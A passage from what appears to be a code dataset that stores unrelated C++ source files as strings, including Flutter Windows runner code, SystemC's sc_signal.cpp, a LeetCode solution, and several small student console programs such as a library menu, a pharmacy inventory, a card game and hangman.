class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  sc_signal.cpp -- The sc_signal<T> primitive channel class.\n\n  Original Author: Martin Janssen, Synopsys, Inc., 2001-05-21\n\n  CHANGE LOG IS AT THE END OF THE FILE\n *****************************************************************************/\n\n\n#include \"sysc/communication/sc_communication_ids.h\"\n#include \"sysc/utils/sc_utils_ids.h\"\n#include \"sysc/communication/sc_signal.h\"\n#include \"sysc/datatypes/int/sc_signed.h\"\n#include \"sysc/datatypes/int/sc_unsigned.h\"\n#include \"sysc/datatypes/bit/sc_lv_base.h\"\n#include \"sysc/kernel/sc_reset.h\"\n\n#include <sstream>\n\nusing sc_dt::sc_lv_base;\nusing sc_dt::sc_signed;\nusing sc_dt::sc_unsigned;\nusing sc_dt::int64;\nusing sc_dt::uint64;\n\nnamespace sc_core {\n\n// to avoid code bloat in sc_signal<T>\n\nvoid\nsc_signal_invalid_writer( sc_object* target, sc_object* first_writer,\n                          sc_object* second_writer, bool check_delta )\n{\n    if ( second_writer )\n    {   \n        std::stringstream msg;\n\n        msg\n            << \"\\n signal \"\n               \"`\" << target->name() << \"' \"\n               \"(\" << target->kind() << \")\"\n            << \"\\n first driver \"\n               \"`\" << first_writer->name() << \"' \"\n              \" (\" << first_writer->kind() << \")\"\n            << \"\\n second driver \"\n               \"`\" << second_writer->name() << \"' \"\n               \"(\" << second_writer->kind() << \")\";\n\n        if( check_delta )\n        {\n            msg << \"\\n first conflicting write in delta cycle \"\n                << sc_delta_count();\n        }\n        SC_REPORT_ERROR( SC_ID_MORE_THAN_ONE_SIGNAL_DRIVER_,\n                         msg.str().c_str() );\n    }\n}\n\nbool\nsc_writer_policy_check_port::\n  check_port( sc_object* target, sc_port_base * port_, bool is_output )\n{\n    if ( is_output && sc_get_curr_simcontext()->write_check() )\n    {\n        // an out or inout port; only one can be connected\n        if( m_output != 0) {\n            sc_signal_invalid_writer( target, m_output, port_, false );\n            return false;\n        } else {\n            m_output = port_;\n        }\n    }\n    return true;\n}\n\nvoid sc_deprecated_get_data_ref()\n{\n    static bool warn_get_data_ref_deprecated=true;\n    if ( warn_get_data_ref_deprecated )\n    {\n        warn_get_data_ref_deprecated=false;\n\tSC_REPORT_INFO(SC_ID_IEEE_1666_DEPRECATION_,\n\t    \"get_data_ref() is deprecated, use read() instead\" );\n    }\n}\n\nvoid sc_deprecated_get_new_value()\n{\n    static bool warn_new_value=true;\n    if ( warn_new_value )\n    {\n        warn_new_value=false;\n\tSC_REPORT_INFO(SC_ID_IEEE_1666_DEPRECATION_,\n\t    \"sc_signal<T>::get_new_value() is deprecated\");\n    }\n}\n\nvoid sc_deprecated_trace()\n{\n    static bool warn_trace_deprecated=true;\n    if ( warn_trace_deprecated )\n    {\n        warn_trace_deprecated=false;\n\tSC_REPORT_INFO(SC_ID_IEEE_1666_DEPRECATION_,\n\t    \"sc_signal<T>::trace() is deprecated\");\n    }\n}\n\nsc_event*\nsc_lazy_kernel_event( sc_event** ev, const char* name )\n{\n    if ( !*ev ) {\n        std::string kernel_name = SC_KERNEL_EVENT_PREFIX \"_\";\n        kernel_name.append( name );\n        *ev = new sc_event( kernel_name.c_str() );\n    }\n    return *ev;\n\n}\n\n// IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII\n\ntemplate< sc_writer_policy POL >\nvoid\nsc_signal<bool,POL>::register_port( sc_port_base& port_,\n                                    const char* if_typename_ )\n{\n    bool is_output = std::string( if_typename_ ) == typeid(if_type).name();\n    if( !policy_type::check_port( this, &port_, is_output ) )\n       ((void)0); // fallback? error has been suppressed ...\n}\n\n\n// write the new value\n\ntemplate< sc_writer_policy POL >\nvoid\nsc_signal<bool,POL>::write( const bool& value_ )\n{\n    bool value_changed = !( m_cur_val == value_ );\n    if ( !policy_type::check_write(this, value_changed) )\n        return;\n    m_new_val = value_;\n    if( value_changed ) {\n        request_update();\n    }\n}\n\ntemplate< sc_writer_policy POL >\ninline\nvoid\nsc_signal<bool,POL>::print( ::std::ostream& os ) const\n{\n",
    "#include \"Book.h\"\nint main()\n{\n\tint NBooks=NULL;\n    FILE* fp = nullptr;\n    Book* books=new Book[1];\n    \n    fopen_s(&fp, \"books.txt\", \"r\"); //\u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 \n    if (fp != NULL) \n    {    \n        fread(&NBooks, sizeof(int), 1, fp);\n        delete[] books;\n        books = new Book[NBooks];\n        for(int i =0 ;i<NBooks;i++)\n        {\n            books[i].loadFromBinFile(fp);\n        }\n        fclose(fp);\n    }\n\n\n\tint menu,deleteId,menuSort,menuEdit,editId,menuFind;\n    Book tmp;\n\tdo \n\t{\n        cout << \"--------------------------------\\n\";\n        cout << \"|             MENU             |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|1.Show all books in library   |\\n\";\n        cout << \"|2.Add new book                |\\n\";\n        cout << \"|3.Remove book                 |\\n\";\n        cout << \"|4.Show sorted books           |\\n\";\n        cout << \"|5.Edit info in book           |\\n\";\n        cout << \"|6.Search book                 |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|0.Exit                        |\\n\";\n        cout << \"--------------------------------\\n\";\n        cout << \" >>> \"; cin >> menu;\n\t\n        switch (menu)\n        {\n        \n        case 1:\n            cout << \"\\n\\n\\n\";\n            for(int i = 0;i<NBooks;i++)\n            {\n                books[i].showBook();\n            }\n            cout << \"\\n\\n\\n\";\n            break;\n        \n        case 2:\n            tmp.addNewBook();\n            if (NBooks==NULL) \n            {\n                cout << \"asd\";\n                books[0] = tmp;\n                NBooks=1;\n            }\n            else\n            {\n                addItemBack(books, NBooks, tmp);\n            }\n            break;\n        \n        case 3:\n            char deleteName[50];\n            cout << \"\\n\\nEnter book name to delete - \";\n            cin.ignore();\n            cin.getline(deleteName,50);\n            cout << endl;\n            deleteId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, deleteName) == 0) \n                {\n                    deleteId = i;\n                    break;\n                }\n            }\n            if(deleteId!=-1)\n            {\n            removeItem(books, NBooks, deleteId);\n            cout << \"Deleted!\\n\" << endl;\n            }\n            else \n            {\n                cout << \"Not found book with that name!\\n\"<<endl;\n            }\n            break;\n\n        case 4:\n            do {\n                cout << \"\\n\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|                           SORT                     |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|1.Sort by pages (from max to min)                   |\\n\";\n                cout << \"|2.Sort by develope year (from older to newest)      |\\n\";\n                cout << \"|3.Sort by add to library year (from older to newest)|\\n\";\n                cout << \"|----------------------------------------------------|\\n\";\n                cout << \"|0.Back to main menu                                 |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \" >>> \"; cin >> menuSort;\n                cout << \"\\n\\n\";\n                \n                switch (menuSort) \n                {\n                case 1:\n                    showSortedPages(books, NBooks);\n                    break;\n                case 2:\n                    showSortedDateWriten(books, NBooks);\n                    break;\n                case 3:\n                    showSortedDateAdded(books, NBooks);\n                    break;\n                case 0:\n                    break;\n                default:\n                    cout << \"Error command!\"<<endl;\n                    break;\n                }\n            } while (menuSort != 0);\n                break;\n        case 5:\n            char editingBook[50];\n            cout << \"\\nEnter name of book for edit - \";\n            cin.ignore();\n            cin.getline(editingBook, 50);\n            cout << endl;\n            editId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, editingBook) == 0)\n                {\n                    editId = i;\n                    break;\n                }\n            }\n            if(editId!=-1)\n            {\n                do {\n\n                    cout << \"\\n\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|                          EDIT                 |\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|1. Edit type of book                           |\\n\";\n                    cout << \"|2. Edit name of book                           |\\n\";\n                    ",
    "#include<iostream>\r\n#include<vector>\r\n#include<fstream>\r\nusing namespace std;\r\nstruct pharmacy{\r\n\tchar id;\r\n\tstring name;\r\n\tint quantity;\r\n\tint price;\r\n};\r\n    pharmacy phar;\r\n    vector<pharmacy> medics;\r\n   \r\n    addval(){\r\n    \tint choice;\r\n    \tdo{\r\n    \t\tcout<<\"Id: \";cin>>phar.id;\r\n    \t\tcout<<\"Name: \";cin>>phar.name;\r\n    \t\tcout<<\"quantity: \";cin>>phar.quantity;\r\n    \t\tcout<<\"price: \";cin>>phar.price;\r\n    \t\tmedics.push_back(phar);\r\n    \t\tcout<<\"save successfuly\"<<endl;\r\n    \t\tcout<<\"enter '0' for exit or '1' for continue: \";cin>>choice;\r\n\t\t}\r\n\t\twhile(choice!=0 && choice ==1);\r\n\t}\r\n\t\r\n\tsearch(){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<i+1<<\". name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<i+1<<\". quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<i+1<<\". price:\"<<medics[i].price<<endl<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tdel (){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tmedics.erase(medics.begin()+i);\r\n\t\t\t\tcout<<\"deleted \"<<medics[i].name<<endl<<endl;\r\n\t\t\t}\r\n\t}\r\n}\r\n\tshow(){\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<\" name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<\" quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<\" price:\"<<medics[i].price<<endl<<endl;\t\r\n\t\t}\r\n\t}\r\n\t\r\n\t\tsave(const vector<pharmacy>&medics, const string& medical){\r\n\t\tofstream out(\"D:/medical.txt\");\r\n\t\tif(!out){\r\n\t\t\tcerr<<\"file not found: \"<<medical<<endl;\r\n\t\t}\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\t\tout<<i+1<<\"Id: \"<<medics[i].id<<endl<<\" name:\"<<medics[i].name<<endl\r\n\t\t\t<<\"quantity: \"<<medics[i].quantity<<endl<<\"price: \"<<medics[i].price<<endl;\r\n\t\t}\r\n\t\tout.close();\r\n\t\tcout<<\"medicines saved to file \"<<medical<<endl<<endl;\r\n\t\t}\r\n\t\r\n\t\r\n    int main(){\r\n    \twhile(true){\r\n    \t\tint value;\r\n    \t\tcout<<\"\\t\\t===================\\n\\n\";\r\n\t\t    cout<<\"\\t\\t-------------------\\n\";\r\n\t\t        cout<<\"1.for add medicines: \"<<endl;\r\n    \t     \tcout<<\"2.for search medicines: \"<<endl;\r\n    \t\t    cout<<\"3.for delete medicines: \"<<endl;\r\n    \t\t    cout<<\"4.for show all medicines: \"<<endl;\r\n    \t\t    cout<<\"5.for save medicines to file: \"<<endl;\r\n    \t    \tcout<<\"6.for exit from program: \"<<endl;\r\n    \t    \tcout<<\"\\t\\t---------------------\\n\";\r\n    \t\tcout<<\"type here:\";cin>>value;\r\n    \t\tswitch(value){ system(\"cls\");\r\n    \t\t\tcase 1:{\r\n\t\t\t\t\taddval();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 2:{        system(\"cls\");\r\n\t\t\t\t\tsearch();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 3:{        system(\"cls\");\r\n\t\t\t\t\tdel();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 4:{        system(\"cls\");\r\n\t\t\t\t\tshow();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 5:{\r\n\t\t\t\t\tsave(medics, \"D:/medical.txt\" );\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 6:{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{system(\"cls\"); cout<<\"invalid input \"<<endl<<endl;}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "class Solution {\npublic:\n    vector<long long> maximumSegmentSum(vector<int>& nums, vector<int>& removeQueries) {\n        int n = nums.size();\n        multiset<long long> s;\n        s.insert(0);\n        set<pair<int, int>> in;\n        vector<long long> pre(n, nums[0]);\n        for(int i = 1; i < n; i++) pre[i] = pre[i - 1] + nums[i];\n        \n        in.insert({0, n - 1});\n        \n        s.insert(pre[n - 1]);\n        \n        vector<long long> ans;\n        for(auto p : removeQueries) {\n            auto it = in.upper_bound({p, 2e9});\n            it--;\n            \n            long long L = (p ? pre[p - 1] : 0) - (it -> first ? pre[it -> first - 1] : 0);\n            long long R = pre[it -> second] - pre[p];\n            long long T = pre[it -> second] - (it -> first ? pre[it -> first - 1] : 0);\n            \n            s.erase(s.find(T));\n            if(it -> first <= p - 1) {\n                in.insert({it -> first, p - 1});\n                s.insert(L);\n            }\n            if(it -> second >= p + 1) {\n                in.insert({p + 1, it -> second});\n                s.insert(R);\n            }\n            \n            in.erase(it);\n            ans.push_back(*s.rbegin());\n        }\n        return ans;\n    }\n};\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <iomanip>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct kart{\r\n    string type;\r\n    int point;\r\n};\r\n\r\nstruct player{\r\n    string name;\r\n    int point = 0;\r\n    vector<kart> kart_mojod;\r\n    vector<kart> kart_nemayesh_mordegan;\r\n};\r\n\r\n\r\nvector<kart> karts;\r\n\r\nint max_point;\r\nint player_number;\r\n\r\nvoid control_unit(player *);\r\nvoid meghdardehi_player(vector<kart> *);\r\nvoid play_game(player *);\r\nvoid what_max_point();\r\nvoid signin_player(player *);\r\nvoid start();\r\nvoid amaliat(player * , int  , bool &);\r\nvoid show_kartsgame(player * , int  , bool & );\r\nbool shart_emtiaz(player );\r\nvoid shomaresh_emtiaz(player *);\r\nbool shart_edame(player *);\r\nvoid tozie_kart(player *);\r\nint win_player_f(player *);\r\nvoid show_table(player *);\r\nvoid sort_players(player *);\r\nvoid end_game(player *);\r\nvoid show_curentkarts(vector<kart> );\r\n\r\nvoid meghdardehi_kartha(){\r\n    srand(time(0));\r\n    kart kohnepich[30];\r\n    kart kalekado[30];\r\n    kart gorbegor[30];\r\n\r\n    for(int i=0 ; i<30 ; i++){\r\n        \r\n        kohnepich[i].type = \"kohne pich\";\r\n        kohnepich[i].point = (rand() % 15) + 1;\r\n        kalekado[i].type = \"kale kadoo\";\r\n        kalekado[i].point = (rand() % 15) + 1;\r\n        gorbegor[i].type = \"gor be gor\";\r\n        gorbegor[i].point = (rand() % 15) + 1;\r\n    }\r\n\r\n    for(int i=0 ; i<30 ; i++)\r\n    {\r\n        karts.push_back(kohnepich[i]);\r\n        karts.push_back(kalekado[i]);\r\n        karts.push_back(gorbegor[i]);\r\n    }\r\n}\r\n\r\nint main()\r\n{   \r\n    system(\"cls\");\r\n    cout << \"\\n\\n\\n\\n be bazi kastel khoshomadid.\\n\";\r\n    cout << \"\\n\\n\\n\\t main menu\\n\";\r\n    cout << \"\\n 1-shoroe bazi jadid\\n 2-exit\\n\\nentekhab: \";\r\n    int ch;\r\n    cin >> ch;\r\n\r\n    switch (ch)\r\n    {\r\n    case 1: start();break;\r\n    case 2: return 0; break;\r\n    default:\r\n        cout << \"entekhab eshtebah ast.\";\r\n        getch();\r\n        main();\r\n    }\r\n}\r\n\r\nvoid what_max_point()\r\n{\r\n    cout << \"hadaxar emtiaz bazi chand bashad? \";\r\n    cin >> max_point;\r\n}\r\n\r\nvoid signin_player(player *p)\r\n{\r\n\r\n    for(int i=0 ; i<player_number ; i++){\r\n        cout << \"name bazikon shomare \" << i+1 << \" ra vared konid: \";\r\n        cin >> p[i].name ;\r\n    }\r\n}\r\n\r\nvoid meghdardehi_player(vector<kart> *k){\r\n    srand(time(0));\r\n    int count = (rand() % (karts.size()-1));\r\n    while(k->size() < 3){\r\n        k->push_back(karts[count]);\r\n        karts.erase(karts.begin()+count);\r\n    }\r\n}\r\n\r\nvoid amaliat(player *p , int i , bool &b)\r\n{\r\n    cout << \"shomare kart mored nazar az dast khod ra entekhab konid: \";\r\n    int choosen;\r\n    cin >> choosen;\r\n\r\n    cout << \"shomare daste kart mored nazar barai entaghal kart entekhab shode ra entekhab konid: \";\r\n    int row_choosen;\r\n    cin >> row_choosen;\r\n\r\n    cout << \"shomare kart mored nazar dar dastekart entekhab shode barai entaghal kart ra entekhab konid: \";\r\n    int kart_gharargiri;\r\n    cin >> kart_gharargiri;\r\n\r\n    if(!(choosen >= 1 && choosen <= 3) || !(row_choosen >= 1 && row_choosen <= player_number) || !(kart_gharargiri >= 1 && kart_gharargiri <= 6))\r\n    {\r\n        cout << \"adad vorodi eshtebah ast.\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan.size() < kart_gharargiri){\r\n        p[row_choosen-1].kart_nemayesh_mordegan.push_back(p[i].kart_mojod[choosen-1]);\r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1].type == p[i].kart_mojod[choosen-1].type){\r\n        \r\n        bool u = 1;\r\n        for(auto &j : p[row_choosen-1].kart_nemayesh_mordegan){\r\n            \r\n            if(j.type == p[i].kart_mojod[choosen-1].type && j.point == p[i].kart_mojod[choosen-1].point){\r\n                j = p[i].kart_mojod[choosen-1];\r\n                u = 0;\r\n            }\r\n        }\r\n        if(u)\r\n            p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1] =  p[i].kart_mojod[choosen-1];\r\n        \r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    \r\n    else{\r\n        cout << \"kart ha ba ham, ham type nistand. bayad kart hai entekhab shode ham type va ham noe bashand.\\n\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    \r\n    if(p[row_choosen-1].kart_nemayesh_mordegan.size() == 6 || p[i].kart_mojod.size() == 0) b = 1;\r\n}\r\n\r\nvoid show_curentkarts(vector<kart> curentkart){\r\n    cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n    for(int k=0 ; k<3 ; k++){\r\n        cout << setfill('-') << setw(16) << \"  \";\r\n    }\r\n    cout << setfill(' ') << setw(29) <<'+' << endl;\r\n    for(int l=0 ; l<7 ; l++){\r\n        if(l == 2){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n            for(int k=0 ; k<curentkart.size() ; k++){\r\n                cout << \"| \" << curentkart[k].type << \" |  \";\r\n            }\r\n            \r\n            cout << setfill(' ') << setw(29) <<'+' << endl;\r\n        }\r\n        else if(l == 4){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <stdlib.h>\nusing namespace std;\n\nint main(){\n    \n    char palavra[30], letra[1], secreta[30];\n    int tam, i, chances, acertos;\n    bool acerto;\n    \n    chances = 6;\n    tam = 0;\n    i = 0;\n    acerto = false;\n    acertos = 0;\n    \n    cout << \"Digite a palavra secreta: \\n\";\n    cin >> palavra;\n    system (\"clear\");\n    \n    while (palavra[i] != '\\0'){\n        i++;\n        tam++;\n    }\n    \n    for(i=0; i<tam; i++){\n        secreta[i] = '-';\n    }\n    \n    while ((chances > 0) && (acertos < tam)){\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\n        cout << \"Palvra secreta: \";\n        for(i=0; i<tam; i++){\n            cout << secreta[i];\n        }\n        cout << \"\\n\\nDigite uma letra: \";\n        cin >> letra[0];\n        for(i=0; i<tam; i++){\n            if (palavra[i] == letra[0]){\n                acerto = true;\n                secreta[i] = palavra[i];\n                acertos++;\n            }\n        }\n        if (!acerto){\n            chances--;\n        }\n        acerto = false;\n        system(\"clear\");\n    }\n    if (acertos==tam){\n        cout << \"Voce venceu\";\n        \n    }else{\n        cout << \"perdeu, burro!\"; \n    }\n    return 0;\n    \n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  